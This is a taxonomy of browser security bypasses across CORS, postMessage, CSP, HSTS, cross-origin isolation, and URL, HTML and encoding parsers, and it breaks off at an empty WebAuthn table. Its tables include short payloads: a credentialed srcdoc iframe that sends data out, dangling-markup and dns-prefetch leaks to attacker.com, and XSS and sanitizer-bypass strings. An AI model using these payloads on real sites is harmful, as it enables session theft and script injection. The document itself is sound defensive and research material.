# Browser Security Model Bypass Mutation/Variation Taxonomy

---

## Classification Structure

Browser security boundaries are defined by origin checks, policy enforcement, transport state, process isolation, parser behavior, and credential APIs. This document focuses on those browser-level mechanisms; topics with dedicated taxonomies are linked rather than duplicated.

This taxonomy organizes browser security bypasses along three axes:

**Axis 1 (Primary): Security Mechanism Target** — Seven browser-level boundaries: Same-Origin Policy, Content Security Policy, transport security, cross-origin isolation, parser/encoding behavior, cross-origin communication metadata, and credential APIs.

**Axis 2 (Cross-cutting): Discrepancy Type** — The nature of the mismatch or bypass technique that enables circumvention. These represent the fundamental classes of security failures that recur across all browser security mechanisms:

| Discrepancy Type | Definition | Example Manifestation |
|-----------------|------------|----------------------|
| **Parser Differential** | Different components parse the same input differently | URL confusion between browser and backend; HTML parsing variations enabling mXSS |
| **Policy Misconfiguration** | Weak or incorrect security policy settings | Wildcard CORS allowing all origins; CSP allowing 'unsafe-inline' |
| **Validation Bypass** | Circumventing origin, domain, or input validation | Null origin CORS bypass; SameSite cookie refresh; domain prefix matching |
| **State Confusion** | Exploiting inconsistent state between components | TOCTOU in authentication; cache vs origin inconsistency |
| **Type Confusion** | Exploiting type/namespace mismatches | DOM clobbering via named elements; prototype pollution; namespace XSS |
| **Protocol Mismatch** | Differences between protocol versions/implementations | HTTP/2 authority vs browser origin; HTTP/3 connection contamination |
| **Injection** | Malicious content surviving sanitization | PostMessage injection without origin validation; dangling markup |
| **API Hijacking** | Intercepting or manipulating browser APIs | WebAuthn API hijack via XSS; Service Worker registration takeover |
| **Downgrade Attack** | Forcing use of weaker security mechanisms | SSL stripping bypassing HSTS; WebAuthn fallback to SMS OTP |
| **Timing/Synchronization** | Exploiting timing windows or race conditions | Cookie refresh before CSRF check; redirect timing manipulation |

**Axis 3 (Mapping): Attack Scenario** — The real-world exploitation context where these bypasses are weaponized. Each technique maps to one or more attack scenarios: Cross-Site Scripting (XSS), information leakage, authentication bypass, privilege escalation, denial of service, cache poisoning, CSRF, account takeover, man-in-the-middle attacks, or supply chain compromise.

### Fundamental Mechanism

The browser security model is built on **trust boundaries** established through origins (scheme + host + port), security policies (CSP, CORS, cookie attributes), and isolation primitives (process isolation, sandboxing). Bypasses occur when:

1. **Differential Interpretation**: Multiple components (parser, validator, renderer, network stack) interpret the same input differently
2. **Policy Gaps**: Security policies contain loopholes, wildcards, or unsafe fallbacks
3. **Architectural Assumptions**: Security mechanisms assume other components have already validated input
4. **Backward Compatibility**: Legacy features (JSONP, document.domain, mixed content) undermine modern security controls

---

## §1. Same-Origin Policy (SOP) Enforcement Bypasses

The Same-Origin Policy is the cornerstone of web security, restricting how documents or scripts from one origin can interact with resources from another origin. SOP bypasses enable attackers to read cross-origin data, perform unauthorized actions, or execute code in the context of a victim origin.

### §1-1. CORS Misconfiguration Exploits

Cross-Origin Resource Sharing (CORS) extends SOP by allowing controlled cross-origin access, but misconfigurations create severe vulnerabilities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Origin Reflection + Credentials** | Server dynamically reflects the request's `Origin` header as `Access-Control-Allow-Origin` while also sending `Access-Control-Allow-Credentials: true`, allowing any origin to read authenticated responses. Note: literal `Access-Control-Allow-Origin: *` with credentials is **blocked by browsers** per the Fetch Standard — the real attack requires the server to echo back the exact requesting origin | Server copies `Origin` header into ACAO without allowlist validation while sending `ACAC: true` |
| **Null Origin Reflection** | Server permits the serialized `null` origin, allowing opaque-origin contexts such as sandboxed `srcdoc` iframes without `allow-same-origin` to access resources | Origin validation checks for the specific string `null` instead of rejecting opaque origins |
| **Domain Prefix/Suffix Matching** | Weak regex validation (e.g., checking if origin contains "example.com") allows attacker-controlled domains | Attacker registers evil-example.com or example.com.attacker.com |
| **Pre-domain Wildcard** | Origins like https://*.example.com reflected when attacker uses https://attacker.example.com | Subdomain wildcard validation without proper TLD boundary checking |
| **HTTP Downgrade** | HTTPS origin accepts CORS from HTTP origin, allowing MITM injection | Mixed content policies not enforced for CORS preflight |
| **CORS Caching Bypass** | CORS preflight responses cached across IP changes (CVE-2025-8036 in Firefox 141) | Preflight cache doesn't invalidate on network change |

The null origin reflection technique is particularly dangerous because sandboxed iframes without `allow-same-origin` and top-level `data:` documents have opaque origins that serialize as `null`. An attacker can create `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://victim.com/api', {credentials:'include'}).then(r=>r.text()).then(data=>exfil(data))</script>"></iframe>` to read a credentialed response only if the server explicitly permits `Origin: null` together with credentials. A plain unsandboxed `srcdoc` iframe inherits its creator's origin and does not satisfy this condition.

### §1-2. PostMessage Vulnerabilities

PostMessage enables intentional cross-origin communication but becomes a bypass vector when origin validation is absent or flawed.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Missing Origin Validation** | Message event listener doesn't check event.origin, accepting messages from any origin | Listener directly uses event.data without validation |
| **Domain Prefix Matching** | Origin check uses indexOf() or startsWith() allowing attacker domains | `if(e.origin.indexOf('example.com')>=0)` matches attacker.example.com.evil |
| **Wildcard Origin Acceptance** | Listener accepts "*" origin or checks for generic patterns | Authentication tokens sent via postMessage with wildcard targetOrigin |
| **Null Origin Bypass** | Origin validation checks for specific origin but null origin opens window and inherits same origin | Srcdoc iframe postMessage to parent window bypasses origin check |
| **Confused Deputy via Identifier Replacement** | Attacker captures legitimate postMessage requests and replaces identifiers with base64-encoded malicious payloads (Microsoft Copilot Studio CVE-2024-49038) | Application trusts message format without validating source |
| **Frame Window Reference Manipulation** | Attacker obtains reference to victim window via window.open() and sends messages before navigation | Message arrives before page fully loads and establishes proper origin checks |

A significant vulnerability class involves applications that process `postMessage` data across an overly broad trust boundary. In Microsoft Copilot Studio (CVE-2024-49038, Microsoft CNA CVSS 9.3), a wildcard in `validDomains` combined with `isFullTrust` exposed a message-reachable XSS path that enabled cross-tenant data exfiltration; this was broader than intended, but not literally trust in every origin.

### §1-3. Cross-Origin Resource Access

Direct cross-origin resource access bypassing SOP through protocol-level or browser-level mechanisms.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Cross-Origin Script Inclusion** | Script tags bypass SOP by design; attacker tricks victim site into including attacker-controlled script | Dynamic script generation based on user input or vulnerable JSONP endpoints |
| **JSONP Callback Injection** | JSONP endpoints with controllable callback parameter allow arbitrary JavaScript execution | Whitelisted domain hosts JSONP endpoint: /api?callback=attacker_function |
| **CSS Cross-Origin Leak** | CSS can load cross-origin resources and leak information through timing, error events, or computed styles | Font-face, @import, background-image leak authentication status |
| **WebSocket Cross-Origin** | WebSocket handshake doesn't enforce SOP; servers may not validate Origin header (CSWSH) | WebSocket connection from attacker.com to victim.com succeeds without CSRF token |
| **DNS Rebinding** | Attacker domain resolves to internal IP after victim loads page, bypassing same-origin check | Attacker controls DNS with low TTL, switching from external IP to 127.0.0.1 |
| **0.0.0.0 Day (Localhost Bypass)** | Browsers allowed web pages to make requests to `0.0.0.0`, which maps to localhost (`127.0.0.1`) on macOS and Linux. This bypassed existing localhost protections — PNA (Private Network Access) and Chrome's `localhost` blocking — because `0.0.0.0` was not classified as a private/local address. Note: Firefox had not implemented PNA/CORS-RFC1918 at the time, so it was not a matter of "bypassing" Firefox's protection but rather the absence of such protection. Attacker pages could reach local development servers (Selenium WebDriver, Pytorch TorchServe, etc.) via `fetch('http://0.0.0.0:port/')` (Oligo Security, Aug 2024) | macOS or Linux host running local services; browser treats `0.0.0.0` as non-private address; 18-year-old bug across Chrome, Firefox, Safari |
| **Document.domain Mutation** | Legacy document.domain setter allows same-site but different-origin pages to access each other | Both pages set document.domain to common parent. Chrome 115+ (2023) effectively disabled the setter by default via `Origin-keyed agent clusters`; Firefox and Safari still support it. Chrome sites can re-enable via `Origin-Agent-Cluster: ?0` header or enterprise policy, but the default behavior no longer permits cross-origin DOM access via this mechanism |
| **Navigation API History Leak** | Chrome's Navigation API (`navigation.entries()`) exposed cross-origin URL information through navigation history entries, leaking full URLs of previously visited cross-origin pages (CVE-2022-4908; NVD describes as "Inappropriate implementation in **Permissions**"). Researcher Johan Carlsson's disclosure attributes the root cause to the Navigation API, but the official NVD description does not specify this — the Navigation API attribution is researcher analysis, not the official characterization | Chrome < 107.0.5304.62 with Navigation API enabled; victim navigates to cross-origin pages before attacker reads entries |

---

## §2. Content Security Policy (CSP) Bypasses

Content Security Policy provides a defense-in-depth layer against XSS by restricting resource loading and script execution. CSP bypasses enable attackers to execute JavaScript despite policy restrictions.

### §2-1. JSONP Endpoint Exploitation

JSONP endpoints on whitelisted domains provide the most reliable CSP bypass vector.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct JSONP Callback** | Whitelisted domain hosts JSONP endpoint with controllable callback parameter | CSP allows script-src 'self' whitelisted.com; attacker loads <script src="//whitelisted.com/api?callback=alert(1)"> |
| **Open Redirect to JSONP** | Whitelisted domain has open redirect; attacker chains redirect to JSONP endpoint on same or different whitelisted domain | CSP blocks direct load but allows redirect chain ending in JSONP |
| **JSONP via Relative Path Overwrite (RPO)** | CSP allows specific path; attacker uses path traversal to reach JSONP endpoint | CSP: script-src 'self' whitelisted.com/scripts/react/; attacker uses ../api/jsonp |
| **User-Controlled JSONP Data** | JSONP endpoint reflects user input in response body, enabling gadget injection | /api/user?id=<script>alert(1)</script>&callback=process |
| **Third-Party Analytics Redirect Gadget** | Third-party analytics or observability platforms (e.g., New Relic) expose authenticated redirect endpoints that accept arbitrary destination URLs via query parameters. When the analytics domain is CSP-whitelisted for script loading, the redirect endpoint serves as a `script-src` bypass gadget — loading attacker-controlled scripts through the trusted domain | CSP whitelists analytics vendor domain; vendor exposes auth-token redirect or custom event endpoint accepting URL parameter (lab.ctbb.show, 2025) |
| **Same-Origin Method Execution (SOME)** | JSONP endpoint with an unrestricted callback parameter allows invoking arbitrary JavaScript methods in the page's global scope — the callback value is interpreted as a dotted method-call chain (e.g., `?callback=opener.document.body.innerHTML`), enabling DOM manipulation or data exfiltration through the trusted origin without injecting new script code | CSP whitelists the JSONP origin or allows `script-src 'self'`; callback parameter accepts dotted property paths without alphanumeric-only validation (Ben Hayak, 2015) |

Tools like CSP Evaluator and JSONPeek automate discovery of JSONP endpoints on whitelisted domains. Google, Yahoo, and many CDNs historically hosted exploitable JSONP endpoints.

### §2-2. Base64 and Data URI Injection

CSP data: scheme allowance enables inline script execution through encoding.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Base64 Data URI** | CSP allows data: in script-src; attacker encodes JavaScript as base64 data URI | <script src="data:text/javascript;base64,YWxlcnQoMSk="> executes despite CSP |
| **SVG Data URI with Script** | CSP allows data: in img-src or object-src; attacker embeds script in SVG data URI | <object data="data:image/svg+xml,<svg><script>alert(1)</script></svg>"> |
| **XSLT Data URI** | CSP allows data: in various contexts; attacker uses XSLT to transform XML into HTML with script | CVE-2025-8032 allowed XSLT documents to sidestep CSP restrictions in Firefox |
| **Blob URI Construction** | Application creates blob URLs from user input; CSP allows blob: scheme | JavaScript creates blob:// URL containing attacker payload |

### §2-3. Unsafe Directive Abuse

CSP policies containing 'unsafe-inline', 'unsafe-eval', or wildcards negate protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unsafe-inline Exploitation** | CSP includes 'unsafe-inline' in script-src, allowing any inline script | All inline <script>, event handlers, javascript: URIs execute |
| **Unsafe-eval Gadgets** | CSP includes 'unsafe-eval'; attacker finds eval(), Function(), setTimeout(string) in application code | Popular libraries (jQuery, AngularJS, Lodash) contain eval sinks |
| **Wildcard Domain Matching** | CSP uses wildcard like script-src https://* allowing any HTTPS domain | Attacker hosts script on any HTTPS domain including attacker-controlled |
| **Self + User Content Subdomain** | CSP allows 'self' but site hosts user-generated content on same origin | User uploads .js file or uses JSONP on user-content subdomain |

### §2-4. DOM-Based CSP Bypasses

CSP can be bypassed through DOM manipulation that doesn't create new script execution contexts.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DOM Clobbering for CSP** | Attacker clobbers DOM properties used in CSP script loading logic | Inject <a id=defaultConfig><a id=defaultConfig name=scriptSrc href="data:,alert(1)"> to override config object |
| **Dangling Markup Injection** | CSP blocks script but attacker uses unclosed tags to exfiltrate data | <img src='//attacker.com/?leak= leaves tag open, browser includes following content in URL |
| **AngularJS Template Injection** | AngularJS on whitelisted domain processes {{}} expressions as code | CSP allows angular CDN; attacker injects {{constructor.constructor('alert(1)')()}} |
| **Mutation XSS (mXSS)** | HTML sanitizer parses differently than browser; mutation during rendering creates script | DOMPurify allows <form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img src onerror=alert(1)>"> (older mglyph/MathML namespace-chain bypass, fixed pre-2.0.17). Distinct from CVE-2024-47875, which is a nesting/depth-based mXSS in DOMPurify <2.5.0 / <3.1.3 (no maximum nesting depth limit) |
| **Service Worker Script Registration** | Attacker registers service worker before CSP applies or in scope without CSP | SW script loads before CSP header; subsequent fetches intercepted |
| **Nonce Reuse via Disk Cache** | Browser disk cache stores full HTTP responses including CSP nonce values in `<script nonce="...">` tags. By forcing cache fallback (e.g., navigating to a cached page, `fetch` with `cache: 'force-cache'`, or exploiting browser heuristic caching), an attacker recovers a previously-issued nonce from the cached response and injects a script tag reusing that nonce — satisfying `script-src 'nonce-...'` policies without needing a fresh nonce from the server | CSP uses nonce-based policy; target page is cacheable (explicit `Cache-Control` or browser heuristic caching); attacker has HTML injection to insert `<script nonce="leaked">` (Jorian Woltjer, 2025) |
| **Resource Hint / Ping-Based Exfiltration** | When CSP blocks `script-src` and `connect-src`, alternative DOM APIs exfiltrate data without script execution: `<link rel=dns-prefetch href="//stolen-token.attacker.com">` encodes data in DNS subdomain labels; `<a ping="https://attacker.com/collect">` sends a POST beacon on click; `<link rel=preconnect>` triggers TCP/TLS handshake to an attacker endpoint — all bypassing `connect-src` and `default-src` restrictions. Combined with CSS attribute selectors (`input[value^="a"] { background: url(//a.attacker.com) }`) for character-by-character extraction, these primitives enable scriptless data exfiltration from CSP-hardened pages | CSP restricts `script-src` and `connect-src`; attacker has HTML/CSS injection capability; target browser supports `dns-prefetch`, `ping`, or `preconnect` resource hints (filedescriptor, 2017) |

### §2-5. Policy Injection and Manipulation

Attacking the CSP policy itself rather than bypassing it.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Header Injection for CSP Weakening** | Attacker injects additional CSP header; however, browsers enforce **all** CSP headers independently (intersection, not union), so an injected weaker policy cannot weaken an existing strict policy. The real risk is injecting `Content-Security-Policy-Report-Only` for exfiltration, or injecting the **first** CSP header when none exists. | CRLF injection in response headers; no existing CSP policy, or targeting report-only exfiltration |
| **Meta Tag CSP Addition** | HTML meta CSP tag adds an additional CSP policy alongside the HTTP header. Per the spec, multiple CSP policies are enforced independently (intersection) — a meta tag cannot weaken an existing HTTP header policy. The real risk is injecting CSP via meta tag when no HTTP header CSP exists, or exploiting browser implementation bugs in multi-policy enforcement | Attacker injects `<meta http-equiv="Content-Security-Policy">` when no existing CSP is set, or targets browser bugs in multi-policy handling |
| **CSP Reporting Endpoint Injection** | Attacker controls report-uri endpoint, receiving reports containing sensitive data | CSP report-uri points to attacker domain; violations leak page content |
| **Browser Extension CSP Bypass** | Inappropriate handling in Chromium's Extensions implementation allows CSP bypass via a crafted HTML page (CVE-2025-9866). NVD describes this as an Extensions implementation flaw, not a webRequest API mechanism — the specific bypass vector has not been publicly detailed beyond the Chromium advisory. | Chromium-based browser with vulnerable Extensions implementation |
| **Browser Engine CSP Implementation Bug** | Bugs in the browser engine's CSP implementation itself (WebKit/Safari, etc.) can nullify correctly-defined CSP policies. Examples include WebKit failing to enforce the CSP sandbox directive to block cross-origin iframe credential access, or `strict-dynamic` interpretation differences causing inline script execution only on specific engines. The attack vector is not the policy definition but the *engine's conformance level with the specification*. | Browser engine's CSP implementation deviates from the W3C specification; attacker can fingerprint the victim's browser engine |
| **CSP Inheritance Failure** | Browser fails to inherit parent CSP when child navigates to javascript:/data:/blob: URLs dynamically, or when child opens static files (.txt/.ico). Safari allowed eval() from about:blank child despite parent blocking unsafe-eval; Chromium failed on asynchronous javascript: navigation. Static file inheritance is a spec ambiguity (DiffCSP, NDSS 2023 — 29 security bugs found total; 6 subsequently patched in Chrome/Safari). | Dynamic iframe.src change; child window opening static files; Safari or Chromium |
| **CSP Hash Handling Bug** | Chromium allowed arbitrary inline scripts in javascript: navigation regardless of hash value in script-src-elem; WebKit used hash-source from script-src to override explicit script-src-elem/script-src-attr 'none' directives due to incorrect fallback logic (DiffCSP, NDSS 2023 — 3 bugs). | CSP uses hash-source with script-src-elem; Chromium or Safari |
| **CSP3 Directive Non-Support** | Browser claims CSP3 support but specific directives (script-src-elem, script-src-attr) are unimplemented. Firefox lacked support for ~3 years; operators specifying these directives find their CSP silently ineffective (DiffCSP, NDSS 2023). | script-src-elem or script-src-attr in CSP; Firefox (pre-July 2022) |
| **CSP Directive Fallback Failure** | Browser does not support nonce-source, hash-source, or strict-dynamic in default-src fallback. When script-src is absent, these values are silently ignored — e.g., hash-source presence should disable unsafe-inline, but browsers ignoring it in default-src continue honoring unsafe-inline (DiffCSP, NDSS 2023). Firefox lacked support 6+ years. | CSP relies on default-src without explicit script-src; Firefox or Safari |
| **Auto-Enabled CSP Directive Values** | Browser enables directive values by default that the spec requires explicit opt-in: Firefox auto-enabled unsafe-hashes (event handlers matching hash-source executed without unsafe-hashes keyword); Safari auto-enabled wildcard * in script-src-elem, making 'none' completely ineffective (DiffCSP, NDSS 2023). | CSP uses hash-source (Firefox) or script-src-elem (Safari) |
| **Conditional Auto-Enabling of unsafe-inline** | Safari auto-enabled unsafe-inline in script-src-elem/script-src-attr when hash-source or strict-dynamic was present — even with arbitrary non-matching hash values. Six distinct bugs creating cross-directive side effects (DiffCSP, NDSS 2023). | CSP contains hash-source or strict-dynamic in script-src-elem/attr; Safari |
| **1xx Status Code Security Header Bypass** | Chromium rendered response body from 1xx HTTP status codes normally while ignoring ALL response headers including CSP, HSTS, and X-Frame-Options. Any page served with 100/101/102 status was completely unprotected (DiffCSP, NDSS 2023; patched Chromium 100). | Web page served with 1xx status; Chromium pre-v100 |
| **Malformed CSP Directive Disabling** | Non-ASCII character in a CSP directive value causes Chromium/Safari to ignore the entire directive; Firefox only drops the invalid value. Attacker who can inject content into CSP disables entire resource protection with a single non-ASCII character (DiffCSP, NDSS 2023). | Attacker can partially inject into CSP; CSP contains attacker-influenceable values |
| **strict-dynamic Outgoing Request Leak** | Under strict-dynamic, browser correctly blocks execution of parser-inserted scripts but fails to block the outgoing HTTP request. Enables data exfiltration via URL parameters without script execution. Firefox leaks via script tags; Chromium leaks via document.write-created scripts (DiffCSP, NDSS 2023). | strict-dynamic with nonce; parser-inserted or dynamically-written script tags |
| **CSP Specification Ambiguities** | W3C CSP spec contains undefined behaviors causing cross-browser inconsistencies: (1) CSP inheritance for static files unaddressed; (2) non-ASCII handling — drop value vs. entire directive; (3) javascript: navigation hash scope — hash full URI or just code (DiffCSP, NDSS 2023). | Same CSP produces different enforcement across browsers |
| **Nested Frame CSP Inheritance Inconsistency** | In deeply nested iframe contexts (srcdoc-in-srcdoc, data:-in-data:), browsers disagree on whether to allow JS fetching from CSP-allowed URLs. CSP enforcement becomes unreliable through multiple layers of local scheme navigation (DiffCSP, NDSS 2023). | Nested iframes using srcdoc or data: URLs; JS fetching from allowed URLs |

---

## §3. Transport Security Bypasses

Transport security mechanisms (HSTS, certificate validation, mixed content protection) ensure encrypted communications. Bypasses enable man-in-the-middle attacks and eavesdropping.

### §3-1. HSTS (HTTP Strict Transport Security) Bypasses

HSTS forces browsers to use HTTPS for specified domains, preventing downgrade attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **First-Visit HSTS Bypass** | HSTS only applies after first visit; attacker intercepts initial HTTP request | User types "bank.com" in address bar (no https://); browser sends HTTP request before HSTS established |
| **NTP Time Manipulation** | Attacker manipulates NTP to set system time past HSTS max-age expiration | HSTS policy expires; subsequent HTTP requests allowed |
| **SSLStrip+ Domain Substitution** | SSLStrip2/sslstrip+ rewrites HTTPS links to HTTP with similar-looking domain not in HSTS preload | https://bank.com → http://bank-secure.com; user doesn't notice domain change |
| **Subdomain HSTS Bypass** | HSTS set on main domain without includeSubDomains; attacker uses HTTP on subdomain | HSTS: max-age=31536000 (no includeSubDomains); attacker uses http://subdomain.bank.com |
| **Homograph Domain HSTS** | Attacker registers IDN homograph domain visually identical to target; no HSTS on homograph | User sees bаnk.com (Cyrillic 'а') instead of bank.com (Latin 'a'); no HSTS protection |

HSTS preload lists partially mitigate these attacks by hardcoding HSTS for major domains in browsers. However, preload lists only cover a small fraction of domains, and many organizations don't submit to the preload list due to the difficulty of removal.

### §3-2. Certificate Validation Bypasses

Certificate validation ensures the remote server is authentic. Bypasses enable MITM attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **User Certificate Override** | Browser allows users to manually accept invalid certificates | User clicks "Proceed Anyway" on certificate warning; attacker's cert accepted |
| **Certificate Pinning Bypass** | Mobile app or browser extension bypasses certificate pinning validation | Malicious proxy uses frameworks like Frida or Xposed to disable pinning |
| **Certificate Chain Manipulation** | Attacker uses certificate from trusted CA for wrong domain; browser validates chain but not domain | Certificate for attacker.com signed by legitimate CA presented for victim.com |
| **Wildcard Certificate Abuse** | Wildcard cert *.example.com obtained for one subdomain used for another | Compromised bad.example.com uses *.example.com cert to MITM secure.example.com |

### §3-3. Mixed Content Exploitation

Mixed content occurs when HTTPS pages load HTTP resources. Bypasses allow injection of malicious content into secure pages.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Passive Mixed Content** | HTTPS page loads HTTP image/media; attacker replaces content via MITM | <img src="http://cdn.example.com/logo.png"> served over HTTP |
| **Active Mixed Content Upgrade Failure** | Browser should block HTTP scripts/stylesheets on HTTPS page but fails | Browser bug or misconfiguration allows <script src="http://evil.com/xss.js"> |
| **Form Action HTTP Submission** | HTTPS page submits form over HTTP, leaking sensitive data | <form action="http://receiver.com/login" method="POST"> on HTTPS page |
| **WebSocket Mixed Content** | HTTPS page establishes ws:// (unencrypted) WebSocket connection | new WebSocket('ws://victim.com/socket') from HTTPS page |

---

## §4. Cross-Origin Isolation Bypasses

Cross-origin isolation (achieved via COOP, COEP, CORP) enables powerful features like SharedArrayBuffer while protecting against Spectre attacks. Bypasses reintroduce Spectre-class vulnerabilities.

### §4-1. COOP/COEP/CORP Misconfiguration

Cross-Origin-Opener-Policy (COOP), Cross-Origin-Embedder-Policy (COEP), and Cross-Origin-Resource-Policy (CORP) work together to isolate origins.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **COEP Credentialless Side-Channels** | COEP: credentialless relaxes the CORP/COEP requirement by loading cross-origin resources without credentials (the iframe gets an ephemeral context without access to the origin's cookies or storage — per MDN). This is not a direct bypass of access controls, but timing or error-based side-channels on the credentialless responses may still leak limited information | Cross-origin resource loaded without credentials; timing/error oracle infers metadata |
| **CORP Missing on Sensitive Resources** | Sensitive API endpoints lack CORP header; COEP allows loading if CORS present | Cross-origin fetch() to API endpoint succeeds if CORS permissive but CORP missing |
| **COOP Popup Manipulation** | COOP: same-origin breaks window.opener reference but popup can still navigate opener | Popup from cross-origin can't read opener but can execute opener.location='//attacker.com' |
| **COOP Same-Origin-Allow-Popups Bypass** | COOP: same-origin-allow-popups preserves opener reference; attacker popup gains access | Main page uses COOP: same-origin-allow-popups; attacker-controlled popup retains window.opener |

Cross-origin isolation remains poorly adopted because it requires coordination across all embedded resources and breaks many legitimate use cases like third-party widgets.

### §4-2. Site Isolation and Spectre Bypasses

Site Isolation mitigates Spectre by putting different origins in separate processes. Bypasses enable cross-process memory leaks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Spook.js Attack** | Transient side-channel attack measuring CPU execution time to leak data across Site Isolation | High-resolution timers (performance.now()) + speculative execution leak cross-origin data |
| **SharedArrayBuffer Timing** | SharedArrayBuffer + Web Workers create high-resolution timer for side-channel attacks | Cross-origin fetch() timing measured via SharedArrayBuffer reveals response content |
| **Safari Partial Site Isolation** | Safari 17.4 (March 2024) began shipping initial cross-site iframe isolation in WebKit, but coverage remains narrower than Chrome's full Site Isolation; SLAP/FLOP (2025) demonstrated Spectre-style cross-site leaks against Safari | Spectre-class attacks against Safari benefit from incomplete process-per-site coverage relative to Chrome/Firefox |

Site Isolation provides defense-in-depth but architecture-level vulnerabilities persist.

---

## §5. Parser and Encoding Bypasses

Differential parsing occurs when different components (browser, WAF, backend) interpret the same input differently. URL parser confusion, HTML parser differentials, character encoding bypasses, and XSLT/XML injection exploit these discrepancies.

### §5-1. URL Parser Confusion

URL parsing inconsistencies between components enable SSRF, authentication bypass, and access control bypass.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Scheme Confusion** | Missing or malformed scheme interpreted differently | Browser treats //example.com as relative but backend treats as absolute; or vice versa |
| **Slash Count Confusion** | Irregular number of slashes in scheme separator | http:///example.com or http://example.com parsed differently by different parsers |
| **Backslash vs Forward Slash** | Windows-style backslashes interpreted as forward slashes in some parsers | http://trusted.com\@evil.com parsed as evil.com by browser but trusted.com by validation |
| **@ Symbol Authority Confusion** | User info section with @ confuses host extraction | http://trusted.com@evil.com parsed as evil.com by browser but backend checks for trusted.com |
| **Port Confusion** | Port number parsing differences | http://example.com:8080@evil.com:80 or http://example.com:65536 parsed inconsistently |
| **IPv6 Address Confusion** | IPv6 brackets and notation parsed differently | http://[::1]:80/ vs http://[::1]/ vs http://0:0:0:0:0:0:0:1 interpreted differently |
| **URL Encoding Confusion** | Percent-encoding decoded at different stages | Browser decodes %2F (/) in path but WAF validates before decoding, allowing path traversal |
| **Unicode/IDN Homograph** | Internationalized domain names with confusable characters | http://аpple.com (Cyrillic 'а') vs http://apple.com (Latin 'a') |

### §5-2. HTML Parser Differential

Browsers, sanitizers, and WAFs may parse the same HTML differently.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Tag Unclosure Exploitation** | Dangling markup: unclosed tag consumes following content into attribute | <img src='//attacker.com?leak= leaves tag open; browser includes CSRF token in URL |
| **Namespace Confusion** | Malformed or namespaced tags interpreted differently | <a:body onload=alert(1)> or <svg:script>alert(1)</svg:script> execute in some contexts |
| **Null Byte Injection** | Null bytes (\x00) terminate strings in C-based parsers but not JavaScript parsers | <img src="safe.jpg\x00.js" onerror=alert(1)> bypasses extension check |
| **Comment Parsing Differential** | Comment syntax interpreted differently | <!--[if mso]><script>alert(1)</script><![endif]--> executes in Outlook but sanitizers may allow |
| **Attribute Quote Confusion** | Backticks, missing quotes, or mixed quotes parsed differently | <img src=`javascript:alert(1)`> or <img src='x' onerror='alert(1)'> |
| **Entity Encoding Bypass** | HTML entities decoded at different stages | &lt;script&gt;alert(1)&lt;/script&gt; decoded after validation |

Dangling markup injection exfiltrates data without JavaScript execution, bypassing CSP. The technique was widespread until Chrome implemented mitigations preventing raw angle brackets and newlines in URLs (though bypass vectors continue to emerge).

### §5-3. Character Encoding Bypasses

Character encoding differences between components enable filter bypasses.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **UTF-7 Encoding** | UTF-7 encoding allows ASCII characters to represent scripts | +ADw-script+AD4-alert(1)+ADw-/script+AD4- encodes <script>alert(1)</script> |
| **UTF-8 Overlong Encoding** | Overlong UTF-8 sequences bypass filters | 0xC0 0xAE represents '.' in overlong encoding, bypassing path traversal filters |
| **UTF-16/UTF-32 Confusion** | Mixed character encodings processed inconsistently | Content-Type: text/html; charset=UTF-16BE with UTF-8 payload |
| **BOM (Byte Order Mark) Injection** | BOM characters alter encoding detection | 0xEF 0xBB 0xBF (UTF-8 BOM) at start of payload changes parsing |
| **Unicode Normalization Bypass** | Unicode normalization (NFC, NFD, NFKC, NFKD) creates equivalent but differently-encoded strings | Filter blocks NFC "ﬁle" but allows NFD decomposed "file" (U+FB01 vs U+0066 U+0069) |
| **Homoglyph Substitution** | Visually similar characters from different Unicode blocks | 'а' (Cyrillic) instead of 'a' (Latin) bypasses string matching |

## §6. Cross-Origin Request Metadata

Fetch Metadata headers help servers distinguish request contexts, but browser and WebView behavior is not uniform.

### §6-1. Fetch Metadata Limitations

Fetch Metadata headers (Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest, Sec-Fetch-User) enable servers to distinguish legitimate from cross-origin requests. Bypasses negate this protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **WebView Missing Sec-Fetch Headers** | Mobile WebView apps bypass browser-layer checks that populate Sec-Fetch headers | Native app uses loadUrl() directly; Sec-Fetch-* headers missing |
| **Client Hints Missing in WebView** | WebView overrides UA string; Client Hints (Sec-CH-UA-*) not sent | App-controlled UA string prevents automatic Client Hints generation |
| **Browser Inconsistency** | Different browsers send different Sec-Fetch values for same action | Firefox doesn't send Sec-Fetch-User on reload; Sec-Fetch-Dest randomly changes to "image" |
| **Sec-Fetch-Site Bypass via PaymentRequest** | PaymentRequest API can trigger requests without proper Sec-Fetch-Site header | Chromium bug allows PaymentRequest to send cross-origin request with incorrect Sec-Fetch-Site |

Fetch Metadata is described as "full of edge cases" by 2024 research, particularly in WebView contexts where many browser-layer checks don't apply. This creates blind spots in bot detection and CSRF protection.

---

## §7. WebAuthn and Passkey Bypasses

Browser-level authentication mechanisms (WebAuthn/Passkeys, Credential Management API, password managers) provide security foundations. Bypasses enable account takeover and credential theft.

### §7-1. Protocol and Integration Failures

WebAuthn (Web Authentication API) and passkeys provide phishing-resistant authentication. Implementation flaws create bypass vectors.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
